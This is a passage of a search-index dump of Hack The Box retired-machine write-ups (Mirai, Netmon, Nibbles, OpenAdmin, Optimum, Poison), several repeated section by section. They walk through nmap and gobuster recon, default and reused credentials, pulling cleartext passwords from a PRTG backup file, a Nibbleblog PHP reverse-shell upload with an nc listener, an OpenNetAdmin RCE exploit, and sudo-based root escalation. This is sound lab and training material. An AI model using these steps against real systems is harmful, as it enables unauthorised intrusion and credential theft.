Logo gives us a pretty huge hint that the target machine is a Raspberry Pi, and Raspberry Pi comes with a default ssh So we tried default ssh credentials on the Raspberry Pi. Username: pi Password: raspberry Great!! Our prediction works successfully and we got PTs shell of the victim\u2019s machine. Now Let\u2019s Look for the User Flag Here I found a user.txt file and used cat \u201cfilename\u201d command for reading this file. cat user.txt Great!! We got our 1st flag And After Browsing we got the flag user.txt on the Location: ~/Desktop/user.txt by executing sudo -l command it tells us that user pi has full privileged in this machine. Then I moved for root access using the previous same password and again I get root access successfully . After going through the root directory we get a root.txt But we get a Hint that our Root Flag is on a USB stick. Let\u2019s check if it is mounted by following command df df (abbreviation for d isk f ree ) is a standard Unix command used to display the amount of available disk space for file systems on which the invoking user has appropriate read access. As you can see in the below screenshot that we have the USB stick on the Device. (From Wikipedia) From given below image we can / media/usbstick . Then execute given below command for further steps Here we found a text file damnit.txt, using cat command we can read this file. Oops!! James has accidentally deleted the root.txt file. Now let\u2019s try to find it somewhere with a little hope. Move back to root directory and type following command which will scan /dev/sdb file system completely and hopefully, it can find deleted root.txt file also. Great!! We got our 2nd flag successfully Enjoy Hacking!!","title":"12. Mirai Writeup.md"},{"location":"Retired/Netmon Writeup/","text":"Hello Guys , I am **Faisal Husaini and this is my writeup on Medium for Netmon machine which has retired. My username on HTB is ***\u201cfaisalelino\u201d . * I was not able to publish other writeups as I was off since 6 months from Infosec and related stuffs due to my exams. Now finally after getting free , the first box I thought to do the simplest one as I almost forgot everything I had in my mind as my skills. So I tried to solve Netmon as suggested from my friends. The IP for this box is 10.10.10.152, so let\u2019s get started NMAP Results nmap -sC -sV 10.10.10.152 We see that 5 ports are open for which 2 are of our current interest , Port 21 , 80 which runs FTP and HTTP service Port 21 \u2014 FTP As we saw from the NMAP scan that Port 21 is open running FTP and also have anonymous login available , so which go and try to login through FTP So we successfully logged in through FTP using Anonymous login. Now we dig into the things we have in the box. We see that the files and folders here are exactly like we have in Windows machines. So we enter the Users folder When I went into Users/Public folder and listed out the files and folders , I was shocked to see that I got the user flag so easily. Seriously , it didnt even took 1 minute to get the user flag in this box. So here we got the user flag. After crawling , I went on to see what the web service is running Port 80- HTTP We get a login page to PRTG Network Monitor , I did a gobuster scan but it was of no use here. I tried to search for default login username and password from Google, which I got was Username:prtgadmin and Password:prtgadmin , then I went on to try login through these credentials and\u2026 We get login failed message as these credentials were not valid. So as I know this Network Monitor is installed in the box , so I will go on and look on the installation path of it and check whether it has any sensitive files or something like that. We go again back to the FTP and search for the PRTG Installed path. When searching about PRTG Network Monitor issues and all on Google , I got a reddit link which had to be saying that the version on PRTG on the box was exposing username and password in clear text on their config files. So I go to FTP and enter that path and get those config files. After searching on google , I found that the configuration files are stored under C:/ProgramData/Paessler/PRTG Network Monitor Folder So we dig into that folder and see there are 3 files of our interest I see there are 3 configurations files , so we get them to our box in binary mode After getting those files and going through all of them , I saw that \u201cPRTG Configuration.old.bak\u201d file had username and password in clear text. So we got the credentials Username: prtgadmin Password: PrTg@dmin2018 We now try to login into the PRTG Monitor Login Page PRTG Network Monitor Login When I try to login with the credentials I got We get login failed message , so I noticed the password had 2018 at the end and we currently here were long far from the beginning of 2019 and also we got the password from a old config backup file , so I tried changing the last part of the password from PrTg@dmin2018 to PrTg@dmin2019 and then try to login We got into the page , now we move onto the priv esc part Privilege Escalation After searching on Google for exploits for PRTG Network Monitor , I got a script which we will use here We use the above script to create a new user \u201c pentest \u201d in the administrator group with password \u201c P3nT3st !\u201d But before that we need to put our current session cookies as given in the usage , so we go and grab it So we got the cookies required for the script and now we finally use the script So we successfully created our new user \u201c pentest \u201d in the administrators group Now we try to login into the box using psexec , so I will get the psexec for linux in my box We successfully logged in through our newly created user \u201c pentest \u201d which holds administrator privileges. Now we move onto getting the root flag The root flag was under C:\\Users\\Administrator\\Desktop folder","title":"25. Netmon Writeup.md"},{"location":"Retired/Netmon Writeup/#nmap-results","text":"nmap -sC -sV 10.10.10.152 We see that 5 ports are open for which 2 are of our current interest , Port 21 , 80 which runs FTP and HTTP service","title":"NMAP Results"},{"location":"Retired/Netmon Writeup/#port-21-ftp","text":"As we saw from the NMAP scan that Port 21 is open running FTP and also have anonymous login available , so which go and try to login through FTP So we successfully logged in through FTP using Anonymous login. Now we dig into the things we have in the box. We see that the files and folders here are exactly like we have in Windows machines. So we enter the Users folder When I went into Users/Public folder and listed out the files and folders , I was shocked to see that I got the user flag so easily. Seriously , it didnt even took 1 minute to get the user flag in this box. So here we got the user flag. After crawling , I went on to see what the web service is running","title":"Port 21 \u2014 FTP"},{"location":"Retired/Netmon Writeup/#port-80-http","text":"We get a login page to PRTG Network Monitor , I did a gobuster scan but it was of no use here. I tried to search for default login username and password from Google, which I got was Username:prtgadmin and Password:prtgadmin , then I went on to try login through these credentials and\u2026 We get login failed message as these credentials were not valid. So as I know this Network Monitor is installed in the box , so I will go on and look on the installation path of it and check whether it has any sensitive files or something like that. We go again back to the FTP and search for the PRTG Installed path. When searching about PRTG Network Monitor issues and all on Google , I got a reddit link which had to be saying that the version on PRTG on the box was exposing username and password in clear text on their config files. So I go to FTP and enter that path and get those config files. After searching on google , I found that the configuration files are stored under C:/ProgramData/Paessler/PRTG Network Monitor Folder So we dig into that folder and see there are 3 files of our interest I see there are 3 configurations files , so we get them to our box in binary mode After getting those files and going through all of them , I saw that \u201cPRTG Configuration.old.bak\u201d file had username and password in clear text. So we got the credentials Username: prtgadmin Password: PrTg@dmin2018 We now try to login into the PRTG Monitor Login Page","title":"Port 80- HTTP"},{"location":"Retired/Netmon Writeup/#prtg-network-monitor-login","text":"When I try to login with the credentials I got We get login failed message , so I noticed the password had 2018 at the end and we currently here were long far from the beginning of 2019 and also we got the password from a old config backup file , so I tried changing the last part of the password from PrTg@dmin2018 to PrTg@dmin2019 and then try to login We got into the page , now we move onto the priv esc part","title":"PRTG Network Monitor Login"},{"location":"Retired/Netmon Writeup/#privilege-escalation","text":"After searching on Google for exploits for PRTG Network Monitor , I got a script which we will use here We use the above script to create a new user \u201c pentest \u201d in the administrator group with password \u201c P3nT3st !\u201d But before that we need to put our current session cookies as given in the usage , so we go and grab it So we got the cookies required for the script and now we finally use the script So we successfully created our new user \u201c pentest \u201d in the administrators group Now we try to login into the box using psexec , so I will get the psexec for linux in my box We successfully logged in through our newly created user \u201c pentest \u201d which holds administrator privileges. Now we move onto getting the root flag The root flag was under C:\\Users\\Administrator\\Desktop folder","title":"Privilege Escalation"},{"location":"Retired/Nibbles Writeup wo Metasploit/","text":"This is the 9th blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by TJnull can be found here . Let\u2019s get started! Reconnaissance First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA htb/nibbles/nmap/initial 10.10.10.75 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file nmap/initial We get back the following result showing that two ports are open: Port 80: running Apache httpd 2.4.18 Port 22 : running OpenSSH 7.2p2 Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -O -p- -oA htb/nibbles/nmap/full 10.10.10.75 We get back the following result. No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -O -p- -oA htb/nibbles/nmap/udp 10.10.10.75 I managed to root the box and write this blog, while this UDP scan still did not terminate. So for this blog, I don\u2019t have the UDP scan results. Enumeration Visit the site in the browser. Nothing useful there, so right click and select View Page Source. We find a comment that gives us a new directory. This leads us to the following page. You can see at the bottom that it is powered by Nibbleblog. This is an indication that it an off the shelf software as apposed to custom software. To confirm that, let\u2019s google Nibbleblog. It\u2019s an open-source engine for creating blogs using PHP. This is good news for us for two reasons: (1) you can download the software and play with it offline. This way you can poke at it as much as you want without having to worry about detection, and (2) since it is open-source and used by other people, it probably has reported vulnerabilities. If this was custom software, we would have had to find zero day vulnerabilities. In order to see if this application is vulnerable, we need to find its version number. To do that, let\u2019s run Gobuster to enumerate directories. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.75/nibbleblog We get back the following results. Navigate to the README page and there we find out that it is using version 4.0.3. Google the name of the software and version to see if it has any exploits. A shell upload vulnerability, that\u2019s what I like to see! Gaining an Initial Foothold Navigate to the shell upload exploit page . Several important pieces of information are mentioned in the page. It\u2019s a code execution vulnerability. The vulnerability is in the \u201cMy image\u201d plugin that allows the upload of PHP files. So it would allow us to upload a PHP reverse shell. It\u2019s an authenticated vulnerability which means that we need admin credentials before we exploit this vulnerability. Alright, so the next steps would be: Navigate to the admin login page and figure out the admin credentials Navigate to the My Image plugin page and upload a PHP reverse shell As mentioned in the Proof of Concept, the admin page can be found here. [http://10.10.10.75/nibbleblog/admin.php](http://10.10.10.75/nibbleblog/admin.php) Navigate to it. Now we need admin credentials. When I\u2019m presented with an enter credentials page, the first thing I try is common credentials (admin/admin, admin/nibbles, nibbles/nibbles, nibbles/admin). If that doesn\u2019t work out, I look for default credentials online that are specific to the technology. Last, I use a password cracker if all else fails. In this case, the common credentials admin/nibbles worked! Step #1 is complete! Next, we need to navigate to the My Image plugin. Click on Plugins My image Configure. Head over to pentestmonkey and get the code for a PHP reverse shell. Change the IP address and port used by your attack machine. Then save it in a file called image.php and upload it on the site. Start a listener on the above chosen port. nc -nlvp 1234 In the browser, navigate to the image we just uploaded to run the reverse shell script. [http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php](http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php) We have a low privileged shell! Let\u2019s first upgrade to a better shell. Python is not installed but python 3 is. python3 -c import pty; pty.spawn( /bin/bash ) This gives us a partially interactive bash shell. To get a fully interactive shell, background the session (CTRL+ Z) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell. stty raw -echo Once that is done, run the command \u201cfg\u201d to bring netcat back to the foreground. Grab the user flag. Now we need to escalate privileges. Privilege Escalation Find out what privileges you have. sudo -l We can run the script monitor.sh in the above specified directory as root without having to enter a root password. Why is that good news for us? If we call a shell in that script, we can run it as root! First, let\u2019s see what the script contains. cat home/nibbler/personal/stuff/monitor.sh It does not exist! We\u2019ll have to create one. mkdir -p home/nibbler/personal/stuff cd /home/nibbler/personal/stuff vi monitor.sh In the monitor.sh script add the following code. #!/bin/sh bash Give it execute privileges. chmod +x monitor.sh Run the script with sudo. sudo ./monitor.sh We are root! Grab the root flag. Lessons Learned To gain an initial foothold on the target machine we had to perform two things: (1) guess the credentials of the administrator, and (2) exploit a vulnerability in the installed Nibbleblog version. The application was using weak authentication credentials, and so we were able to guess the admistrator credentials. The application was also using the vulnerable \u201cMy image\u201d plugin which allowed us to run a reverse shell back to our attack machine. This shows the importance of enforcing the use of strong authentication credentials and patching your software. In this case, I\u2019m not sure if a patch was even made available. The application also reached its end of life, so the recommendation would be to use other software to host your blog, or at the very least remove the \u201cMy image\u201d plugin so that an attacker cannot exploit this specific vulnerability. To escalate to root privileges, I used a security configuration that was clearly no longer needed by the user since the script is no longer there. This allowed me to run arbitrary commands with root privileges. The system admin should have conformed to the principle of least privilege and not given a regular user the ability to run a script with root privileges. Conclusion 9 machines down, 32 more to go!","title":"14. Nibbles Writeup w/o Metasploit.md"},{"location":"Retired/Nibbles Writeup wo Metasploit/#reconnaissance","text":"First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA htb/nibbles/nmap/initial 10.10.10.75 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file nmap/initial We get back the following result showing that two ports are open: Port 80: running Apache httpd 2.4.18 Port 22 : running OpenSSH 7.2p2 Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -O -p- -oA htb/nibbles/nmap/full 10.10.10.75 We get back the following result. No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -O -p- -oA htb/nibbles/nmap/udp 10.10.10.75 I managed to root the box and write this blog, while this UDP scan still did not terminate. So for this blog, I don\u2019t have the UDP scan results.","title":"Reconnaissance"},{"location":"Retired/Nibbles Writeup wo Metasploit/#enumeration","text":"Visit the site in the browser. Nothing useful there, so right click and select View Page Source. We find a comment that gives us a new directory. This leads us to the following page. You can see at the bottom that it is powered by Nibbleblog. This is an indication that it an off the shelf software as apposed to custom software. To confirm that, let\u2019s google Nibbleblog. It\u2019s an open-source engine for creating blogs using PHP. This is good news for us for two reasons: (1) you can download the software and play with it offline. This way you can poke at it as much as you want without having to worry about detection, and (2) since it is open-source and used by other people, it probably has reported vulnerabilities. If this was custom software, we would have had to find zero day vulnerabilities. In order to see if this application is vulnerable, we need to find its version number. To do that, let\u2019s run Gobuster to enumerate directories. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.75/nibbleblog We get back the following results. Navigate to the README page and there we find out that it is using version 4.0.3. Google the name of the software and version to see if it has any exploits. A shell upload vulnerability, that\u2019s what I like to see!","title":"Enumeration"},{"location":"Retired/Nibbles Writeup wo Metasploit/#gaining-an-initial-foothold","text":"Navigate to the shell upload exploit page . Several important pieces of information are mentioned in the page. It\u2019s a code execution vulnerability. The vulnerability is in the \u201cMy image\u201d plugin that allows the upload of PHP files. So it would allow us to upload a PHP reverse shell. It\u2019s an authenticated vulnerability which means that we need admin credentials before we exploit this vulnerability. Alright, so the next steps would be: Navigate to the admin login page and figure out the admin credentials Navigate to the My Image plugin page and upload a PHP reverse shell As mentioned in the Proof of Concept, the admin page can be found here. [http://10.10.10.75/nibbleblog/admin.php](http://10.10.10.75/nibbleblog/admin.php) Navigate to it. Now we need admin credentials. When I\u2019m presented with an enter credentials page, the first thing I try is common credentials (admin/admin, admin/nibbles, nibbles/nibbles, nibbles/admin). If that doesn\u2019t work out, I look for default credentials online that are specific to the technology. Last, I use a password cracker if all else fails. In this case, the common credentials admin/nibbles worked! Step #1 is complete! Next, we need to navigate to the My Image plugin. Click on Plugins My image Configure. Head over to pentestmonkey and get the code for a PHP reverse shell. Change the IP address and port used by your attack machine. Then save it in a file called image.php and upload it on the site. Start a listener on the above chosen port. nc -nlvp 1234 In the browser, navigate to the image we just uploaded to run the reverse shell script. [http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php](http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php) We have a low privileged shell! Let\u2019s first upgrade to a better shell. Python is not installed but python 3 is. python3 -c import pty; pty.spawn( /bin/bash ) This gives us a partially interactive bash shell. To get a fully interactive shell, background the session (CTRL+ Z) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell. stty raw -echo Once that is done, run the command \u201cfg\u201d to bring netcat back to the foreground. Grab the user flag. Now we need to escalate privileges.","title":"Gaining an Initial Foothold"},{"location":"Retired/Nibbles Writeup wo Metasploit/#privilege-escalation","text":"Find out what privileges you have. sudo -l We can run the script monitor.sh in the above specified directory as root without having to enter a root password. Why is that good news for us? If we call a shell in that script, we can run it as root! First, let\u2019s see what the script contains. cat home/nibbler/personal/stuff/monitor.sh It does not exist! We\u2019ll have to create one. mkdir -p home/nibbler/personal/stuff cd /home/nibbler/personal/stuff vi monitor.sh In the monitor.sh script add the following code. #!/bin/sh bash Give it execute privileges. chmod +x monitor.sh Run the script with sudo. sudo ./monitor.sh We are root! Grab the root flag.","title":"Privilege Escalation"},{"location":"Retired/Nibbles Writeup wo Metasploit/#lessons-learned","text":"To gain an initial foothold on the target machine we had to perform two things: (1) guess the credentials of the administrator, and (2) exploit a vulnerability in the installed Nibbleblog version. The application was using weak authentication credentials, and so we were able to guess the admistrator credentials. The application was also using the vulnerable \u201cMy image\u201d plugin which allowed us to run a reverse shell back to our attack machine. This shows the importance of enforcing the use of strong authentication credentials and patching your software. In this case, I\u2019m not sure if a patch was even made available. The application also reached its end of life, so the recommendation would be to use other software to host your blog, or at the very least remove the \u201cMy image\u201d plugin so that an attacker cannot exploit this specific vulnerability. To escalate to root privileges, I used a security configuration that was clearly no longer needed by the user since the script is no longer there. This allowed me to run arbitrary commands with root privileges. The system admin should have conformed to the principle of least privilege and not given a regular user the ability to run a script with root privileges.","title":"Lessons Learned"},{"location":"Retired/Nibbles Writeup wo Metasploit/#conclusion","text":"9 machines down, 32 more to go!","title":"Conclusion"},{"location":"Retired/Openadmin Writeup/","text":"RECON As usual, let\u2019s start with a Nmap scan. Nmap scan report for 10.10.10.171 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache/2.4.29 (Ubuntu) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel SSH and HTTP ports are open. Let\u2019s start with port 80. Manual Visit On visiting the page, we are presented with the default Apache installation page. Gobuster Here\u2019s the gobuster output, /music (Status: 301) /artwork (Status: 301) /sierra (Status: 301) /server-status (Status: 403) Visiting /music There\u2019s a login button, on clicking it gets us to [http://10.10.10.171/ona](http://10.10.10.171/ona) The software version is exposed. A quick google search shows us a Remote Code Execution vulnerability. I exploited it using this. amriunix/ona-rce OpenNetAdmin 18.1.1 - Remote Code Execution https://amriunix.com/ check -- Verify if the target is vulnerable exploit -- Exploiting the target URL -- The remote target pip3 install --user requests git clone https://github.com/amriunix/ona-rce.git All the code provided on this repository is for educational/research purposes only. Just update the value of xajxr in the exploit, by intercepting the request. Shell as www-data We gain code execution on the box with the above exploit. Time to get a reverse shell. Looks like we found some usernames and passwords. Let\u2019s try these against SSH for potential password reuse. Shell as Jimmy The credentials work for jimmy user on SSH. Internal services On running linpeas, we can see that there\u2019s a service running locally on port 52846. Let\u2019s port forward it to our box and check what it\u2019s got. Port Forwarding We are presented with a login page, the usual admin:admin , admin:password and so on do not work here. Moving on with enumeration. We find this interesting lines from /var/www/internal/index.php ?php $msg = ; if (isset($_POST[ login ]) !empty($_POST[ username ]) !empty($_POST[ password ])) { if ($_POST[ username ] == jimmy hash( sha512 ,$_POST[ password ]) == 00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1 ) { $_SESSION[ username ] = jimmy ; header( Location: /main.php ); } else { $msg = Wrong username or password. ; } } The hash got cracked We can login now too, Shell as Joanna The above SSH key is of Joanna, but it\u2019s encrypted. Time for ssh2john and john to get to work. Privesc to Root Joanna has sudo permission on nano Following https://gtfobins.github.io/gtfobins/nano/#sudo , we get root shell,","title":"19. Openadmin Writeup.md"},{"location":"Retired/Openadmin Writeup/#recon","text":"As usual, let\u2019s start with a Nmap scan. Nmap scan report for 10.10.10.171 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache/2.4.29 (Ubuntu) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel SSH and HTTP ports are open. Let\u2019s start with port 80.","title":"RECON"},{"location":"Retired/Openadmin Writeup/#manual-visit","text":"On visiting the page, we are presented with the default Apache installation page.","title":"Manual Visit"},{"location":"Retired/Openadmin Writeup/#gobuster","text":"Here\u2019s the gobuster output, /music (Status: 301) /artwork (Status: 301) /sierra (Status: 301) /server-status (Status: 403) Visiting /music There\u2019s a login button, on clicking it gets us to [http://10.10.10.171/ona](http://10.10.10.171/ona) The software version is exposed. A quick google search shows us a Remote Code Execution vulnerability. I exploited it using this. amriunix/ona-rce OpenNetAdmin 18.1.1 - Remote Code Execution https://amriunix.com/ check -- Verify if the target is vulnerable exploit -- Exploiting the target URL -- The remote target pip3 install --user requests git clone https://github.com/amriunix/ona-rce.git All the code provided on this repository is for educational/research purposes only. Just update the value of xajxr in the exploit, by intercepting the request.","title":"Gobuster"},{"location":"Retired/Openadmin Writeup/#shell-as-www-data","text":"We gain code execution on the box with the above exploit. Time to get a reverse shell. Looks like we found some usernames and passwords. Let\u2019s try these against SSH for potential password reuse.","title":"Shell as www-data"},{"location":"Retired/Openadmin Writeup/#shell-as-jimmy","text":"The credentials work for jimmy user on SSH.","title":"Shell as Jimmy"},{"location":"Retired/Openadmin Writeup/#internal-services","text":"On running linpeas, we can see that there\u2019s a service running locally on port 52846. Let\u2019s port forward it to our box and check what it\u2019s got.","title":"Internal services"},{"location":"Retired/Openadmin Writeup/#port-forwarding","text":"We are presented with a login page, the usual admin:admin , admin:password and so on do not work here. Moving on with enumeration. We find this interesting lines from /var/www/internal/index.php ?php $msg = ; if (isset($_POST[ login ]) !empty($_POST[ username ]) !empty($_POST[ password ])) { if ($_POST[ username ] == jimmy hash( sha512 ,$_POST[ password ]) == 00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1 ) { $_SESSION[ username ] = jimmy ; header( Location: /main.php ); } else { $msg = Wrong username or password. ; } } The hash got cracked We can login now too,","title":"Port Forwarding"},{"location":"Retired/Openadmin Writeup/#shell-as-joanna","text":"The above SSH key is of Joanna, but it\u2019s encrypted. Time for ssh2john and john to get to work.","title":"Shell as Joanna"},{"location":"Retired/Openadmin Writeup/#privesc-to-root","text":"Joanna has sudo permission on nano Following https://gtfobins.github.io/gtfobins/nano/#sudo , we get root shell,","title":"Privesc to Root"},{"location":"Retired/Optimum Writeup/","text":"Summary This is a Recon The first thing I do is run an nmap on the target to see which ports are open. This box only has one port open, and it seems to be running HttpFileServer httpd 2.3. Lets take a look in searchsploit and see if we find any known vulnerabilities. We see a remote code execution exploit for our exact version, lets take a look. For this RCE exploit to work, we need nc.exe to be reachable in our web server. Lets fire out our listener, and copy over the executable to the required location. Now that we have met the pre-exploit requirements, lets download and run the exploit. It could take several attempts, so if you do not get a shell on your listener the first time, try it again. Foothold/ Local Enumeration Now that we got a shell, lets run the command systeminfo to enumerate this box. There is a great tool in Kali called windows-exploit-suggester which we can use, now that we have the data from systeminfo . To utilize this tool we need to save the output of systeminfo and save it to a text file. You might also have to update the tool like me, which I did below. Now that the tool is updated, we can run the tool and see some suggested exploits. Privilege Escalation While this tool gave us some great suggestions, i found an easier exploit while looking around on Google. I found this executable that will elevate our privileges on this box. To get this executable on the target box, check out the Privilege Escalation section of my \u2018Access\u2019 walkthrough for a guide to build a powershell wget script. Now that we have the our executable on our target, we can run it to get nt authority\\system shell. Pwned!!! Lets go get our flags.","title":"31. Optimum Writeup.md"},{"location":"Retired/Optimum Writeup/#summary","text":"This is a","title":"Summary"},{"location":"Retired/Optimum Writeup/#recon","text":"The first thing I do is run an nmap on the target to see which ports are open. This box only has one port open, and it seems to be running HttpFileServer httpd 2.3. Lets take a look in searchsploit and see if we find any known vulnerabilities. We see a remote code execution exploit for our exact version, lets take a look. For this RCE exploit to work, we need nc.exe to be reachable in our web server. Lets fire out our listener, and copy over the executable to the required location. Now that we have met the pre-exploit requirements, lets download and run the exploit. It could take several attempts, so if you do not get a shell on your listener the first time, try it again.","title":"Recon"},{"location":"Retired/Optimum Writeup/#foothold-local-enumeration","text":"Now that we got a shell, lets run the command systeminfo to enumerate this box. There is a great tool in Kali called windows-exploit-suggester which we can use, now that we have the data from systeminfo . To utilize this tool we need to save the output of systeminfo and save it to a text file. You might also have to update the tool like me, which I did below. Now that the tool is updated, we can run the tool and see some suggested exploits.","title":"Foothold/ Local Enumeration"},{"location":"Retired/Optimum Writeup/#privilege-escalation","text":"While this tool gave us some great suggestions, i found an easier exploit while looking around on Google. I found this executable that will elevate our privileges on this box. To get this executable on the target box, check out the Privilege Escalation section of my \u2018Access\u2019 walkthrough for a guide to build a powershell wget script. Now that we have the our executable on our target, we can run it to get nt authority\\system shell. Pwned!!! Lets go get our flags.","title":"Privilege Escalation"},{"location":"Retired/Poison Writeup wo Metasploit/","text":"This is the 21st blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by TJ_Null can be found here . Let\u2019s get started! Reconnaissance First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA initial 10.10.10.84 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file initial We get back the following result showing that 2 ports are open: Port 22: running OpenSSH 7.2 Port 80: running Apache httpd 2.4.29 Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-03 22:13 EST Nmap scan report for 10.10.10.84 Host is up (0.031s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0) | ssh-hostkey: | 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA) | 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA) |_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519) 80/tcp open http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32) |_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32 |_http-title: Site doesn t have a title (text/html; charset=UTF-8). No exact OS matches for host (If you know what OS is running on it, see [https://nmap.org/submit/](https://nmap.org/submit/) ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=1/3%OT=22%CT=1%CU=35958%PV=Y%DS=2%DC=I%G=Y%TM=5E1002E4 ..... Network Distance: 2 hops Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 28.65 seconds Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -p- -oA full 10.10.10.84 No other ports are open. Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -p- -oA udp 10.10.10.84 We get back the following result showing that no other ports are open. Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-03 22:16 EST Nmap scan report for 10.10.10.84 Host is up (0.034s latency). Not shown: 65534 closed ports PORT STATE SERVICE 514/udp open|filtered syslog Nmap done: 1 IP address (1 host up) scanned in 3340.51 seconds Before we move on to enumeration, let\u2019s make some mental notes about the nmap scan results. The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it\u2019s unlikely that we gain initial access through this port, unless we find credentials. Ports 80 is running a web server, so we\u2019ll perform our standard enumeration techniques on it. Enumeration I always start off with enumerating HTTP first. Port 80 Visit the application in the browser. It\u2019s a simple website that takes in a script name and executes it. We\u2019re given a list of scripts to test, so let\u2019s test them one by one. The ini.php info.php scripts don\u2019t give us anything useful. The phpinfo.php script gives us a wealth of information on the PHP server configuration. The listfiles.php script gives us the following output. Array ( [0] = . [1] = .. [2] = browse.php [3] = index.php [4] = info.php [5] = ini.php [6] = listfiles.php [7] = phpinfo.php [8] = pwdbackup.txt ) The pwdbackup.txt file looks interesting. Let\u2019s see if we can view it in the application. We get the following output. This password is secure, it s encoded atleast 13 times.. what could go wrong really.. 